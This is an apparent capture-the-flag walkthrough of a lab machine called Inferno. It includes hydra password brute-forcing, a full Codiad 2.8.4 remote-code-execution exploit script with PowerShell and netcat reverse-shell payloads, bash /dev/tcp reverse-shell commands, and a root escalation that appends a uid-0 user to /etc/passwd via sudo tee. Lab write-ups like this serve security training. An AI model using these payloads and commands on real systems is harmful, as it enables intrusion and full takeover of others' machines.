# Inferno - Medium

* Add ```inferno.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v inferno.thm```

* For some reason, the scan shows a lot of open ports, a lot of them seem to be false (service name followed by '?'), so we will have to enumerate whatever service seems fit; ```nmap``` shows the TCP sequence prediction as very high too

* The only services which seem to be confirmed are SSH and HTTP - we can start enumerating the latter:

  ```sh
  gobuster dir -u http://inferno.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,json,docx,pdf,zip,bac,sh,png,md,jpeg,cgi,pl,aspx,sql,xml -t 25
  # directory scan

  ffuf -c -u "http://inferno.thm" -H "Host: FUZZ.inferno.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 638 -s
  # subdomain enum
  # no hits

  gobuster vhost -u http://inferno.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # nothing found
  ```

* The webpage titled "Dante's Inferno", includes a prose in Italian, and an image; when reverse searched, we get the painting's name - "The Map of Hell" . When translated, the text gives us this:

  ```text
  Oh, how great a marvel it seemed to me
  when I saw three faces on his head!
  The one in front, and that one was red;

  the other were two, which were added to this one
  above the middle of each shoulder,
  and you reach the place of the ridge  
  ```

* Three faces on head reminds me of ```hydra``` tool, since Hydra is also a dragon with multiple heads

* We can check the image file downloaded using basic stego tools:

  ```sh
  file 1.jpg

  exiftool 1.jpg

  binwalk --dd='.*' 1.jpg
  # nothing of interest
  ```

* Directory scanning gives us a directory /inferno, which has a basic HTTP authentication setup - we can try cracking this using ```hydra```

* The title of the webpage includes the words 'dante' and 'inferno'; other than that, 'admin' and 'root' are common usernames. In addition to this, we can generate a wordlist from the website's words using ```cewl```. And based on this we can bruteforce:

  ```sh
  cewl -d 5 -m 4 -e http://inferno.thm -w users.txt

  vim users.txt
  # append these usernames - dante, inferno, admin, root

  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt inferno.thm http-get '/inferno' -u -t 25
  # by default, hydra will go through all passwords first with each username
  # -u is to tell hydra to go first for all usernames with each password
  ```

* After quite a while, ```hydra``` gives us the creds "admin:dante1" - we can use this for '/inferno' login

* After using the creds for basic authentication, the /inferno page leads us to a login form for Codiad

* Google shows that Codiad is a web-based cloud IDE

* Using the previous creds "admin:dante1", we are able to log into this, and we get access to a project named 'inferno'; we can check these project files for any interesting finds

* 'config.php' shows the base path as ```/var/www/html/inferno``` and '/data/users.php' shows the hash of creds - this matches with the used password

* Searching for exploits related to Codiad gives us quite a few results related to authenticated RCE - we can go through the [Python script for Codiad 2.8.4 - authenticated RCE](https://www.exploit-db.com/exploits/49705)

* For the script to work, we would have to add the part for the initial HTTP authentication as well, otherwise it will not work - the final script will look like this (I did not edit the Windows payload part):

  ```py
  # Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
  # Discovery by: WangYihang
  # Vendor Homepage: http://codiad.com/
  # Software Links : https://github.com/Codiad/Codiad/releases
  # Tested Version: Version: 2.8.4
  # CVE: CVE-2018-14009


  #!/usr/bin/env python
  # encoding: utf-8
  import requests
  import sys
  import json
  import base64
  session = requests.Session()
  def login(domain, username, password):
      global session
      url = domain + "/components/user/controller.php?action=authenticate"
      data = {
          "username": username,
          "password": password,
          "theme": "default",
          "language": "en"
      }
      # need to include this header for basic HTTP authentication
      headers = {
          "Authorization": "Basic YWRtaW46ZGFudGUx"
      }
      response = session.post(url, data=data, headers=headers, verify=False)
      content = response.text
      print("[+] Login Content : %s" % (content))
      if 'status":"success"' in content:
          return True
  def get_write_able_path(domain):
      global session
      url = domain + "/components/project/controller.php?action=get_current"
      headers = {
          "Authorization": "Basic YWRtaW46ZGFudGUx"
      }
      response = session.get(url, headers=headers, verify=False)
      content = response.text
      print("[+] Path Content : %s" % (content))
      json_obj = json.loads(content)
      if json_obj['status'] == "success":
          return json_obj['data']['path']
      else:
          return False
  def base64_encode_2_bytes(host, port):
      payload = '''
      $client = New-Object System.Net.Sockets.TCPClient("__HOST__",__PORT__);
      $stream = $client.GetStream();
      [byte[]]$bytes = 0..255|%{0};
      while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
          $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
          $sendback = (iex $data 2>&1 | Out-String );
          $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
          $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
          $stream.Write($sendbyte,0,$sendbyte.Length);
          $stream.Flush();
      }
      $client.Close();
      '''
      result = ""
      for i in payload.replace("__HOST__", host).replace("__PORT__", str(port)):
          result += i + "\x00"
      return base64.b64encode(result.encode()).decode().replace("\n", "")
  def build_powershell_payload(host, port):
      preffix = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc "
      return preffix + base64_encode_2_bytes(host, port).replace("+", "%2b")
  def exploit(domain, username, password, host, port, path, platform):
      global session
      url = domain + \
          "/components/filemanager/controller.php?type=1&action=search&path=%s" % (
              path)
      if platform.lower().startswith("win"):
          # new version escapeshellarg
          # escapeshellarg on windows will quote the arg with ""
          # so we need to try twice
          payload = '||%s||' % (build_powershell_payload(host, port))
          payload = "search_string=Hacker&search_file_type=" + payload
          headers = {
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
          response = session.post(url, data=payload, headers=headers, verify=False)
          content = response.text
          print(content)
          # old version escapeshellarg
          payload = '%%22||%s||' % (build_powershell_payload(host, port))
          payload = "search_string=Hacker&search_file_type=" + payload
          headers = {
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
          response = session.post(url, data=payload, headers=headers, verify=False)
          content = response.text
          print(content)
      else:
          # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
          payload = '"%%0Anc %s %d|/bin/bash %%23' % (host, port)
          payload = "search_string=Hacker&search_file_type=" + payload
          headers = {
              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              "Authorization": "Basic YWRtaW46ZGFudGUx",
              }
          response = session.post(url, data=payload, headers=headers, verify=False)
          content = response.text
          print(content)
  def promote_yes(hint):
      print(hint)
      return True
  def main():
      if len(sys.argv) != 7:
          print("Usage : ")
          print("        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
          print("        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
          print("Example : ")
          print("        python %s http://localhost/ admin admin 8.8.8.8 8888 linux" % (sys.argv[0]))
          print("        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows" % (sys.argv[0]))
          print("Author : ")
          print("        WangYihang <wangyihanger@gmail.com>")
          exit(1)
      domain = sys.argv[1]
      username = sys.argv[2]
      password = sys.argv[3]
      host = sys.argv[4]
      port = int(sys.argv[5])
      platform = sys.argv[6]
      if platform.lower().startswith("win"):
          print("[+] Please execute the following command on your vps: ")
          print("nc -lnvp %d" % (port))
          if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
              exit(1)
      else:
          print("[+] Please execute the following command on your vps: ")
          print("echo 'bash -c \"bash -i >/dev/tcp/%s/%d 0>&1 2>&1\"' | nc -lnvp %d" % (host, port + 1, port))
          print("nc -lnvp %d" % (port + 1))
          if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
              exit(1)
      print("[+] Starting...")
      if not login(domain, username, password):
          print("[-] Login failed! Please check your username and password.")
          exit(2)
      print("[+] Login success!")
      print("[+] Getting writeable path...")
      path = get_write_able_path(domain)
      if path == False:
          print("[+] Get current path error!")
          exit(3)
      print("[+] Writeable Path : %s" % (path))
      print("[+] Sending payload...")
      exploit(domain, username, password, host, port, path, platform)
      print("[+] Exploit finished!")
      print("[+] Enjoy your reverse shell!")
  if __name__ == "__main__":
      main()
  ```

* Running this exploit using ```python3``` does not work, but it works with ```python2```:

  ```sh
  echo 'bash -c "bash -i >/dev/tcp/10.14.78.65/4445 0>&1 2>&1"' | nc -lnvp 4444

  nc -nvlp 4445
  # setup both listeners

  python2 codiad-2.8.4-rce.py http://inferno.thm/inferno admin dante1 10.14.78.65 4444 linux
  # run the exploit
  ```

* Now, the exploit works successfully and we get the reverse-shell; however periodically the 'exit' command is run on its own and we lose shell access, due to which we need to setup the listeners and run the exploit again and again (as a temporary workaround, I kept running ```/bin/bash``` command every minute so that we do not lose reverse shell after getting kicked)

* In our reverse shell, we can continue basic enumeration:

  ```sh
  ls -la
  # web directory does not include anything interesting

  ls -la /home
  # we have one user - dante

  ls -la /home/dante
  # enumerate all files and folders

  ls -la /home/dante/Desktop
  # we have .txt files here
  # but they are large in size

  file /home/dante/Desktop/*
  # ELF 64-bit LSB shared object
  # these are not text files, but binaries

  # continue enumeration

  ls -la /home/dante/Documents
  # we have .doc files here
  
  # to confirm these are legit
  file /home/dante/Documents
  # turns out these are binaries as well

  ls -la /home/dante/Downloads
  # we have several .docx files and one hidden .dat file

  file /home/dante/Downloads/*
  # all of the .docx files are binaries as well
  # this command did not include the hidden file

  file /home/dante/Downloads/.download.dat
  # ASCII text, with very long lines, with no line terminators
  
  # check the file
  cat /home/dante/Downloads/.download.dat
  # prints some code, we can check this later

  ls -la /home/dante/Pictures
  # we have .jpg files, but 0 bytes in size

  # other directories are empty
  ```

* From the file '.download.dat' found in Downloads directory, we get some code - we need to identify & decode this

* Using the 'Magic' recipe on CyberChef, we get to know that it can be decoded from Hex - doing so gives us another passage in Italian, and at the end of the script we have credentials "dante:V1rg1l10h3lpm3"

* We can log into SSH as 'dante' now:

  ```sh
  ssh dante@inferno.thm
  # use above password

  # we are able to login
  cat local.txt
  # get user flag
  ```

* In SSH access also, every minute a ```logout``` or ```exit``` command is run, due to which we lose our access - to avoid this, like previously, a temporary workaround would be to run ```/bin/bash``` every minute while we enumerate the system for privesc (alternatively, you can run the ```/bin/bash``` command several times in a single row)

* While enumerating, we can check ```sudo -l```, which shows we can run ```/usr/bin/tee``` as root without password

* [GTFOBins](https://gtfobins.github.io/gtfobins/tee/) shows that we can append to any file as root - we can create a privileged user of our own by modifying ```/etc/passwd```:

  ```sh
  # in attacker machine
  # generate hash value of password for new user
  openssl passwd -1 -salt testuser password1
  
  # use above generated hash value
  # with tee command
  echo 'testuser:$1$testuser$Fq4RWB1/RrIgp3os8Q1fy.:0:0:root:/root:/bin/bash' | sudo /usr/bin/tee -a /etc/passwd

  su testuser
  # use 'password1'
  # we get root shell

  # read root flag at /root/proof.txt
  ```
